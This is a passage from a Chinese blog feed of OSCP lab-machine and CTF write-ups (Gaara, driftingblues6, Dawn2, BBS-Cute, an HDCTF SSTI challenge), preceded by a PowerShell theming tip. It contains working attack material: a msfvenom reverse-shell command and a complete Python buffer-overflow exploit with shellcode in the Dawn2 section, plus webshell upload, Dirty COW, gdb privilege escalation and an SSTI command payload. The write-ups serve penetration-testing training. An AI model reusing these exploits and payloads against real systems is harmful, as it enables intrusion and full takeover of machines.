class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oh-my-posh init pwsh --config &#x27;C:\Users\81120\AppData\Local\Programs\oh-my-posh\themes\honukai.omp.json&#x27; | Invoke-Expression</span><br></pre></td></tr></table></figure><p>可以多挑挑选选，这个只是临时的试用</p><h3 id="2、持久化保存配置"><a href="#2、持久化保存配置" class="headerlink" title="2、持久化保存配置"></a>2、持久化保存配置</h3><p>创建配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-Item -Path $PROFILE -Type File -Force</span><br></pre></td></tr></table></figure><p>编辑配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad $PROFILE</span><br></pre></td></tr></table></figure><p>将上述主题启动命令复制进去保存即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oh-my-posh init pwsh --config &#x27;C:\Users\81120\AppData\Local\Programs\oh-my-posh\themes\honukai.omp.json&#x27; | Invoke-Expression</span><br></pre></td></tr></table></figure><p>暂时美化到这里，其中Terminal 更多的配置可以按个人喜好在设置中配置。</p><p>如果powershell的美化不想要了，则通过编辑配置文件，使用 # 注释掉即可。</p>]]></content>
      
      
      <categories>
          
          <category> 其他经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMD美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-Gaara</title>
      <link href="/2024/08/20/OSCP-Gaara/"/>
      <url>/2024/08/20/OSCP-Gaara/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—Gaara"><a href="#OSCP系列靶机—Gaara" class="headerlink" title="OSCP系列靶机—Gaara"></a>OSCP系列靶机—Gaara</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-Gaara/image-20240818171416371.png" alt="image-20240818171416371"></p><h2 id="二、端口探测"><a href="#二、端口探测" class="headerlink" title="二、端口探测"></a>二、端口探测</h2><h3 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h3><p><img src="/img/OSCP-Gaara/image-20240818171536703.png" alt="image-20240818171536703"></p><p>仅仅存在两个端口，Apache 2.4.38 存在SSRF漏洞，不知道这个靶场会不会用得上</p><h3 id="2、探测服务版本"><a href="#2、探测服务版本" class="headerlink" title="2、探测服务版本"></a>2、探测服务版本</h3><p><img src="/img/OSCP-Gaara/image-20240818172419454.png" alt="image-20240818172419454"></p><p>linux 4.x-5.x ，版本稍高，估计不存在脏牛提权漏洞</p><h3 id="3、对端口进行漏洞探测"><a href="#3、对端口进行漏洞探测" class="headerlink" title="3、对端口进行漏洞探测"></a>3、对端口进行漏洞探测</h3><p><img src="/img/OSCP-Gaara/image-20240818171936357.png" alt="image-20240818171936357"></p><p>并未有漏洞发现</p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><h3 id="1、首页源代码信息收集"><a href="#1、首页源代码信息收集" class="headerlink" title="1、首页源代码信息收集"></a>1、首页源代码信息收集</h3><p><img src="/img/OSCP-Gaara/image-20240818172219685.png" alt="image-20240818172219685"></p><p>都很保守啊，只有一张外部链接的图片，我这个靶场环境问题图片没有显示出来</p><p><img src="/img/OSCP-Gaara/image-20240818172254302.png" alt="image-20240818172254302"></p><h3 id="2、目录扫描"><a href="#2、目录扫描" class="headerlink" title="2、目录扫描"></a>2、目录扫描</h3><p>这里需要准备大字典才行</p><p><img src="/img/OSCP-Gaara/image-20240818174935118.png" alt="image-20240818174935118"></p><p><img src="/img/OSCP-Gaara/image-20240818175014609.png" alt="image-20240818175014609"></p><p>啥也没有，不能把，果然，页面源代码给东西了</p><p><img src="/img/OSCP-Gaara/image-20240818175039632.png" alt="image-20240818175039632"></p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><p><img src="/img/OSCP-Gaara/image-20240818175259054.png" alt="image-20240818175259054"></p><p>似乎是三篇长的差不多的文章，简单翻译过后，在讲述某个故事</p><p>我们在三篇文章中搜索pass关键字，发现不一样的地方</p><p><img src="/img/OSCP-Gaara/image-20240818180001926.png" alt="image-20240818180001926"></p><p>尝试base64解密失败，看起来确实像base加密，尝试其他base解密</p><p><img src="/img/OSCP-Gaara/image-20240818180237934.png" alt="image-20240818180237934"></p><p>成功获取某个用户的账号密码，尝试ssh登陆</p><p><img src="/img/OSCP-Gaara/image-20240818180432566.png" alt="image-20240818180432566"></p><p>啊？密码不对，离了个大谱，尝试下爆破吧；成功爆破出来一个密码</p><p><img src="/img/OSCP-Gaara/image-20240820125758003.png" alt="image-20240820125758003"></p><p>成功Getsehll</p><p><img src="/img/OSCP-Gaara/image-20240820125910626.png" alt="image-20240820125910626"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><p><img src="/img/OSCP-Gaara/image-20240820132010591.png" alt="image-20240820132010591"></p><p>给了一个提示，看一下</p><p><img src="/img/OSCP-Gaara/image-20240820132101723.png" alt="image-20240820132101723"></p><p>给AI 分析下</p><p><img src="/img/OSCP-Gaara/image-20240820132523801.png" alt="image-20240820132523801"></p><p>BF 语言写的程序，但是这个靶机似乎没有运行环境，暂时搁置</p><h3 id="2、权限提升"><a href="#2、权限提升" class="headerlink" title="2、权限提升"></a>2、权限提升</h3><p>查找高权限命令</p><p><img src="/img/OSCP-Gaara/image-20240820133020771.png" alt="image-20240820133020771"></p><p>查找gdb 提权命令，两句话提权</p><p><img src="/img/OSCP-Gaara/image-20240820133423265.png" alt="image-20240820133423265"></p><p>成功提权至root</p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—driftingblues6</title>
      <link href="/2024/07/30/OSCP-driftingblues6/"/>
      <url>/2024/07/30/OSCP-driftingblues6/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—driftingblues6"><a href="#OSCP系列靶机—driftingblues6" class="headerlink" title="OSCP系列靶机—driftingblues6"></a>OSCP系列靶机—driftingblues6</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-driftingblues6/image-20240730181037863.png" alt="image-20240730181037863"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><p>1、快速扫描</p><p><img src="/img/OSCP-driftingblues6/image-20240730181110594.png" alt="image-20240730181110594"></p><p>2、全端口扫描</p><p><img src="/img/OSCP-driftingblues6/image-20240730181503239.png" alt="image-20240730181503239"></p><p>只开放了80端口</p><p>3、服务版本扫描</p><p><img src="/img/OSCP-driftingblues6/image-20240730181515900.png" alt="image-20240730181515900"></p><p>80使用apache 2.2.22版本，算是一个低版本；使用linux 3.2-3.16的一个系统版本，这个版本也是低版本，存在可能的漏洞</p><p>4、漏洞探测</p><p><img src="/img/OSCP-driftingblues6/image-20240730182436530.png" alt="image-20240730182436530"></p><p>只做了目录扫描</p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><h3 id="1、首页和源代码"><a href="#1、首页和源代码" class="headerlink" title="1、首页和源代码"></a>1、首页和源代码</h3><p><img src="/img/OSCP-driftingblues6/image-20240730181243631.png" alt="image-20240730181243631"></p><p><img src="/img/OSCP-driftingblues6/image-20240730181303628.png" alt="image-20240730181303628"></p><p>在源代码中发现了一些东西，不过对这个靶场似乎没什么作用</p><h3 id="2、目录扫描"><a href="#2、目录扫描" class="headerlink" title="2、目录扫描"></a>2、目录扫描</h3><p><img src="/img/OSCP-driftingblues6/image-20240730181838025.png" alt="image-20240730181838025"></p><p>出来一些有趣的文件和文件夹</p><p><img src="/img/OSCP-driftingblues6/image-20240730182549959.png" alt="image-20240730182549959"></p><p>并且给了我们一个重要的提示，<code>.zip</code></p><h3 id="3、指定后缀扫描"><a href="#3、指定后缀扫描" class="headerlink" title="3、指定后缀扫描"></a>3、指定后缀扫描</h3><p><img src="/img/OSCP-driftingblues6/image-20240730185532900.png" alt="image-20240730185532900"></p><p>扫到一个之前没扫到的家伙</p><p><img src="/img/OSCP-driftingblues6/image-20240730202032703.png" alt="image-20240730202032703"></p><h3 id="4、spammer-zip"><a href="#4、spammer-zip" class="headerlink" title="4、spammer.zip"></a>4、spammer.zip</h3><p><img src="/img/OSCP-driftingblues6/image-20240730185930263.png" alt="image-20240730185930263"></p><p>需要密码，做hash转换和破解</p><p><img src="/img/OSCP-driftingblues6/image-20240730185948589.png" alt="image-20240730185948589"></p><p>给到密码</p><p><img src="/img/OSCP-driftingblues6/image-20240730190030543.png" alt="image-20240730190030543"></p><p>似乎是一组账号密码</p><h3 id="5、textpattern登陆后台"><a href="#5、textpattern登陆后台" class="headerlink" title="5、textpattern登陆后台"></a>5、textpattern登陆后台</h3><p><img src="/img/OSCP-driftingblues6/image-20240730182933263.png" alt="image-20240730182933263"></p><p>输入账号密码，成功登陆后台</p><p><img src="/img/OSCP-driftingblues6/image-20240730201935141.png" alt="image-20240730201935141"></p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><h3 id="1、漏洞查询"><a href="#1、漏洞查询" class="headerlink" title="1、漏洞查询"></a>1、漏洞查询</h3><p>进来之后，在下面能看到当前cms 的版本号</p><p><img src="/img/OSCP-driftingblues6/image-20240730202556693.png" alt="image-20240730202556693"></p><p>查找漏洞</p><p><img src="/img/OSCP-driftingblues6/image-20240730202625552.png" alt="image-20240730202625552"></p><p>这俩都是相当不错的，进行尝试；首先尝试第一个</p><p>脚本内给出了使用方法</p><p><img src="/img/OSCP-driftingblues6/image-20240730202720117.png" alt="image-20240730202720117"></p><p>尝试执行，似乎执行失败了，提示文件上传是None</p><p><img src="/img/OSCP-driftingblues6/image-20240730203205877.png" alt="image-20240730203205877"></p><p>再次查看使用方法，依然出错</p><p><img src="/img/OSCP-driftingblues6/image-20240730214524552.png" alt="image-20240730214524552"></p><h3 id="2、后台上传文件getshell"><a href="#2、后台上传文件getshell" class="headerlink" title="2、后台上传文件getshell"></a>2、后台上传文件getshell</h3><p>最终去后台找漏洞点了，成功上传shell.php</p><p><img src="/img/OSCP-driftingblues6/image-20240730214657701.png" alt="image-20240730214657701"></p><p>之前做目录扫描，发现有<code>files</code>的目录，查看一下</p><p><img src="/img/OSCP-driftingblues6/image-20240730214745282.png" alt="image-20240730214745282"></p><p>OK，好极了，反弹shell</p><p><img src="/img/OSCP-driftingblues6/image-20240730214944409.png" alt="image-20240730214944409"></p><p>成功反弹shell</p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><p><img src="/img/OSCP-driftingblues6/image-20240730215555584.png" alt="image-20240730215555584"></p><p>果然，版本很低，尝试脏牛提权</p><h3 id="2、脏牛提权"><a href="#2、脏牛提权" class="headerlink" title="2、脏牛提权"></a>2、脏牛提权</h3><p>搜索一下</p><p><img src="/img/OSCP-driftingblues6/image-20240730220405248.png" alt="image-20240730220405248"></p><p>这里使用之前用到过的 40839.c 这个脚本</p><p><img src="/img/OSCP-driftingblues6/image-20240730221504186.png" alt="image-20240730221504186"></p><p>成功添加上了，su到这个用户，成功root</p><p><img src="/img/OSCP-driftingblues6/image-20240730221543070.png" alt="image-20240730221543070"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CTF竞赛】[HDCTF 2023]SearchMaster—SSTI注入</title>
      <link href="/2024/07/28/CTF-competition-SSTI-injection/"/>
      <url>/2024/07/28/CTF-competition-SSTI-injection/</url>
      
        <content type="html"><![CDATA[<h1 id="HDCTF-2023-SearchMaster—SSTI注入"><a href="#HDCTF-2023-SearchMaster—SSTI注入" class="headerlink" title="[HDCTF 2023]SearchMaster—SSTI注入"></a>[HDCTF 2023]SearchMaster—SSTI注入</h1><h2 id="一、看题"><a href="#一、看题" class="headerlink" title="一、看题"></a>一、看题</h2><p><img src="/img/CTF-competition-SSTI-injection/image-20240728194430099.png" alt="image-20240728194430099"></p><p>页面很干净，什么信息几乎都收集不到，但是给了一个<code>BUT YOU CAN POST ME A DATA</code>的提示，想让我们给他一个post 的data请求</p><h2 id="二、解题"><a href="#二、解题" class="headerlink" title="二、解题"></a>二、解题</h2><h3 id="1、POST请求"><a href="#1、POST请求" class="headerlink" title="1、POST请求"></a>1、POST请求</h3><p>那我们给他一个POST请求</p><p><img src="/img/CTF-competition-SSTI-injection/image-20240728194604129.png" alt="image-20240728194604129"></p><p>发现我们给他什么，他就输出什么</p><h3 id="2、验证SSTI注入漏洞"><a href="#2、验证SSTI注入漏洞" class="headerlink" title="2、验证SSTI注入漏洞"></a>2、验证SSTI注入漏洞</h3><p><img src="/img/CTF-competition-SSTI-injection/image-20240728194733538.png" alt="image-20240728194733538"></p>49做了执行，变成了49，证明存在SSTI注入<h3 id="3、验证是否是-Jinja2-模块"><a href="#3、验证是否是-Jinja2-模块" class="headerlink" title="3、验证是否是 Jinja2 模块"></a>3、验证是否是 Jinja2 模块</h3><p>只需要做<code>&#123;&#123;7*'7'&#125;&#125;</code>，返回7777777表示是 Jinja2 模块</p><blockquote><p>Jinja2 模块表示后端是Python</p><p>Twig 模块表示后端是PHP</p><p>当然，除此之外也可以用其他方法判断后端语言</p></blockquote><p><img src="/img/CTF-competition-SSTI-injection/image-20240728195206648.png" alt="image-20240728195206648"></p><p>判断是Twig 模块，表示后端是PHP</p><h3 id="4、解题"><a href="#4、解题" class="headerlink" title="4、解题"></a>4、解题</h3><p>直接一步到位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;system(&#x27;ls&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/CTF-competition-SSTI-injection/image-20240728200824653.png" alt="image-20240728200824653"></p><h3 id="5、题解之外"><a href="#5、题解之外" class="headerlink" title="5、题解之外"></a>5、题解之外</h3><p> 如果是Jinja2 模块，推荐使用焚靖工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing webui</span><br></pre></td></tr></table></figure><p><img src="/img/CTF-competition-SSTI-injection/image-20240728195435863.png" alt="image-20240728195435863"></p><p>在左侧选择post请求方式，表单和模板环境，即可执行，之后在下面执行命令即可</p>]]></content>
      
      
      <categories>
          
          <category> CTF竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-Dawn2</title>
      <link href="/2024/07/28/OSCP-Dawn2/"/>
      <url>/2024/07/28/OSCP-Dawn2/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—dawn2"><a href="#OSCP系列靶机—dawn2" class="headerlink" title="OSCP系列靶机—dawn2"></a>OSCP系列靶机—dawn2</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-Dawn2/image-20240726205020608.png" alt="image-20240726205020608"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><p>1、快速扫描</p><p><img src="/img/OSCP-Dawn2/image-20240726205044350.png" alt="image-20240726205044350"></p><p>2、全端口扫描</p><p><img src="/img/OSCP-Dawn2/image-20240726205254304.png" alt="image-20240726205254304"></p><p>3、服务版本探测</p><p><img src="/img/OSCP-Dawn2/image-20240726205342068.png" alt="image-20240726205342068"></p><p>4、漏洞探测</p><p><img src="/img/OSCP-Dawn2/image-20240726205652735.png" alt="image-20240726205652735"></p><p>几乎没什么发现</p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><h3 id="1、首页及源代码"><a href="#1、首页及源代码" class="headerlink" title="1、首页及源代码"></a>1、首页及源代码</h3><p><img src="/img/OSCP-Dawn2/image-20240726205552603.png" alt="image-20240726205552603"></p><p>这里给了一个zip 的压缩包</p><p><img src="/img/OSCP-Dawn2/image-20240726205628385.png" alt="image-20240726205628385"></p><h3 id="2、dawn-zip信息收集"><a href="#2、dawn-zip信息收集" class="headerlink" title="2、dawn.zip信息收集"></a>2、dawn.zip信息收集</h3><p><img src="/img/OSCP-Dawn2/image-20240726205746749.png" alt="image-20240726205746749"></p><p>有个exe跟<code>README.txt</code>文件</p><p><img src="/img/OSCP-Dawn2/image-20240726205848246.png" alt="image-20240726205848246"></p><p>昂？DAWN Multi 服务的客户端；由于是exe，放在我的本机尝试执行</p><p><img src="/img/OSCP-Dawn2/image-20240726210314566.png" alt="image-20240726210314566"></p><p>没懂啥意思，查了一下DAWN Multi Server 的相关信息</p><blockquote><p>DAWN Multi Server 是一个多功能服务器解决方案，具备多种服务功能。以下是一些关键点：</p><ol><li><strong>邮件服务器</strong>：提供企业邮局服务。</li><li><strong>DNS服务器</strong>：负责域名解析。</li><li><strong>FTP服务器</strong>：用于文件传输。</li><li><strong>路由器和NAT防火墙</strong>：提供网络路由和安全防护。</li><li><strong>DHCP服务器</strong>：动态分配IP地址。</li><li><strong>网站服务器</strong>：支持PHP和MySQL，可以搭建网站。</li><li><strong>代理服务器</strong>：提供网络代理服务。</li><li><strong>NFS网络文件服务器</strong>：用于文件共享。</li><li><strong>Samba跨平台文件服务器</strong>：支持跨平台文件共享。</li><li><strong>BBS网站</strong>：提供论坛服务，架构为PHP+MySQL。</li></ol></blockquote><p>搜索一下有关该服务的漏洞</p><p><img src="/img/OSCP-Dawn2/image-20240726211234318.png" alt="image-20240726211234318"></p><p>在查看链接之后，很显然不是我们需要的</p><h3 id="3、目录扫描"><a href="#3、目录扫描" class="headerlink" title="3、目录扫描"></a>3、目录扫描</h3><p><img src="/img/OSCP-Dawn2/image-20240726210743593.png" alt="image-20240726210743593"></p><p>啥也没</p><h3 id="4、dawn-exe折腾"><a href="#4、dawn-exe折腾" class="headerlink" title="4、dawn.exe折腾"></a>4、dawn.exe折腾</h3><p>最后还是回归这个dawn.exe</p><p><img src="/img/OSCP-Dawn2/image-20240726212120572.png" alt="image-20240726212120572"></p><p>他一直处于一种监听的模式，尝试用nc 去连接他；我们需要知道它监听的端口是哪个，这个查找方式有很多</p><p><img src="/img/OSCP-Dawn2/image-20240726212528625.png" alt="image-20240726212528625"></p><p>找到这个程序将会监听在1985，而凑巧的是，靶机的这个端口开放且在监听；使用nc 尝试端口连接</p><p><img src="/img/OSCP-Dawn2/image-20240726212827414.png" alt="image-20240726212827414"></p><p>似乎有反应，尝试编写脚本</p><p><img src="/img/OSCP-Dawn2/image-20240726215142768.png" alt="image-20240726215142768"></p><p>噢，有点反应，继续尝试；继续尝试，发现它经常性的卡壳，就如同<code>README.txt</code>写的那样</p><p><img src="/img/OSCP-Dawn2/image-20240726220500965.png" alt="image-20240726220500965"></p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><p>最后我们需要搞出来msf 的payload，之后去加载执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.101 LPORT=8888 -f c -b &#x27;\x00&#x27; EXITFUNC=thread</span><br></pre></td></tr></table></figure><p>payload，替换buff和ip、端口即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">buff = (&quot;\xda\xde\xd9\x74\x24\xf4\x58\xbe\x7f\x77\xb1\x99\x2b\xc9&quot;</span><br><span class="line">&quot;\xb1\x12\x31\x70\x17\x03\x70\x17\x83\x97\x8b\x53\x6c\x56&quot;</span><br><span class="line">&quot;\xaf\x63\x6c\xcb\x0c\xdf\x19\xe9\x1b\x3e\x6d\x8b\xd6\x41&quot;</span><br><span class="line">&quot;\x1d\x0a\x59\x7e\xef\x2c\xd0\xf8\x16\x44\x23\x52\xd0\xf1&quot;</span><br><span class="line">&quot;\xcb\xa1\x21\xdb\xb3\x2f\xc0\xab\xa2\x7f\x52\x98\x99\x83&quot;</span><br><span class="line">&quot;\xdd\xff\x13\x03\x8f\x97\xc5\x2b\x43\x0f\x72\x1b\x8c\xad&quot;</span><br><span class="line">&quot;\xeb\xea\x31\x63\xbf\x65\x54\x33\x34\xbb\x17&quot;)</span><br><span class="line"></span><br><span class="line">payload = &quot;A&quot; * 272 + &quot;\x77\x17\x58\x34&quot;  + &quot;\x90&quot; * 32 + buff + &quot;\x00&quot;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((&#x27;192.168.56.105&#x27;, 1985))</span><br><span class="line">    s.send(payload)</span><br><span class="line">    s.close()</span><br><span class="line">    print(&quot;payload send successfully&quot;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(e)</span><br><span class="line">print(&quot;error&quot;)</span><br></pre></td></tr></table></figure><p>成功getshell</p><p><img src="/img/OSCP-Dawn2/image-20240726223809041.png" alt="image-20240726223809041"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><p><img src="/img/OSCP-Dawn2/image-20240726224305145.png" alt="image-20240726224305145"></p><p>有一个跟dawn.exe 差不多的全root的dawn-BETA.exe 文件欸</p><p>下载到本地尝试执行</p><p><img src="/img/OSCP-Dawn2/image-20240726224634962.png" alt="image-20240726224634962"></p><p>跟哪个dawn.exe 一样欸，看监听在哪个端口</p><p><img src="/img/OSCP-Dawn2/image-20240726224945062.png" alt="image-20240726224945062"></p><p>1435，看来是剩下的那个端口，用同样方法再来一遍即可提权到root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">buff = (&quot;\xda\xde\xd9\x74\x24\xf4\x58\xbe\x7f\x77\xb1\x99\x2b\xc9&quot;</span><br><span class="line">&quot;\xb1\x12\x31\x70\x17\x03\x70\x17\x83\x97\x8b\x53\x6c\x56&quot;</span><br><span class="line">&quot;\xaf\x63\x6c\xcb\x0c\xdf\x19\xe9\x1b\x3e\x6d\x8b\xd6\x41&quot;</span><br><span class="line">&quot;\x1d\x0a\x59\x7e\xef\x2c\xd0\xf8\x16\x44\x23\x52\xd0\xf1&quot;</span><br><span class="line">&quot;\xcb\xa1\x21\xdb\xb3\x2f\xc0\xab\xa2\x7f\x52\x98\x99\x83&quot;</span><br><span class="line">&quot;\xdd\xff\x13\x03\x8f\x97\xc5\x2b\x43\x0f\x72\x1b\x8c\xad&quot;</span><br><span class="line">&quot;\xeb\xea\x31\x63\xbf\x65\x54\x33\x34\xbb\x17&quot;)</span><br><span class="line"></span><br><span class="line">payload = &quot;A&quot; * 272 + &quot;\x77\x17\x58\x34&quot;  + &quot;\x90&quot; * 32 + buff + &quot;\x00&quot;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((&#x27;192.168.56.105&#x27;, 1435))</span><br><span class="line">    s.send(payload)</span><br><span class="line">    s.close()</span><br><span class="line">    print(&quot;payload send successfully&quot;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(e)</span><br><span class="line">print(&quot;error&quot;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—BBS-Cute</title>
      <link href="/2024/07/25/OSCP-BBS-Cute/"/>
      <url>/2024/07/25/OSCP-BBS-Cute/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—BBS-Cute"><a href="#OSCP系列靶机—BBS-Cute" class="headerlink" title="OSCP系列靶机—BBS-Cute"></a>OSCP系列靶机—BBS-Cute</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-BBS-Cute/image-20240725191241484.png" alt="image-20240725191241484"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><p>1、快速扫描</p><p><img src="/img/OSCP-BBS-Cute/image-20240725191321528.png" alt="image-20240725191321528"></p><p>2、全端口扫描</p><p><img src="/img/OSCP-BBS-Cute/image-20240725191602485.png" alt="image-20240725191602485"></p><p>3、服务版本探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -sC -O -p 22,80,88,110,995 192.168.56.104</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BBS-Cute/image-20240725191705700.png" alt="image-20240725191705700"></p><p>88端口开了一个http服务，但标题确实404未找到，110和995是POP3服务，可能存在一些信息</p><p>4、漏洞探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p 22,80,88,110,995 192.168.56.104</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BBS-Cute/image-20240725192231998.png" alt="image-20240725192231998"></p><p>80端口发现了一些目录；诶诶，这个88端口的服务怎么变了，而且开放的还是kerberos服务</p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><h3 id="1、首页及源代码"><a href="#1、首页及源代码" class="headerlink" title="1、首页及源代码"></a>1、首页及源代码</h3><p><img src="/img/OSCP-BBS-Cute/image-20240725192034199.png" alt="image-20240725192034199"></p><p>Apache2的首页，应该拿不到什么信息</p><h3 id="2、目录扫描"><a href="#2、目录扫描" class="headerlink" title="2、目录扫描"></a>2、目录扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.56.104/ -x 404,403</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BBS-Cute/image-20240725192210604.png" alt="image-20240725192210604"></p><p>有很多目录和文件</p><h3 id="3、index-php文件"><a href="#3、index-php文件" class="headerlink" title="3、index.php文件"></a>3、index.php文件</h3><p><img src="/img/OSCP-BBS-Cute/image-20240725193140677.png" alt="image-20240725193140677"></p><p>一个登陆点，同时在这里给到了一个版本号：2.1.2；第一时间当然是搜索有无漏洞了</p><p><img src="/img/OSCP-BBS-Cute/image-20240725193923653.png" alt="image-20240725193923653"></p><p>我们对第四个非常感兴趣，尝试执行，没有东西</p><p><img src="/img/OSCP-BBS-Cute/image-20240725202632179.png" alt="image-20240725202632179"></p><h3 id="4、文件上传尝试"><a href="#4、文件上传尝试" class="headerlink" title="4、文件上传尝试"></a>4、文件上传尝试</h3><p><img src="/img/OSCP-BBS-Cute/image-20240725204919639.png" alt="image-20240725204919639"></p><p>这里给了文件上传的POC，但是利用提交是需要一个上传点，那这里需要登陆后台去先；注册用户登陆后台</p><p><img src="/img/OSCP-BBS-Cute/image-20240725205528454.png" alt="image-20240725205528454"></p><p>注册成功，来到后台；在注册中的验证码需要bp抓包查看；之后找文件上传的点</p><p><img src="/img/OSCP-BBS-Cute/image-20240725205749405.png" alt="image-20240725205749405"></p><p>进来之后，可以看到正好有上传的点</p><p><img src="/img/OSCP-BBS-Cute/image-20240725205822531.png" alt="image-20240725205822531"></p><p>按照POC的步骤尝试上传；先写一个webshell，上传抓包后改包</p><p><img src="/img/OSCP-BBS-Cute/image-20240725204954003.png" 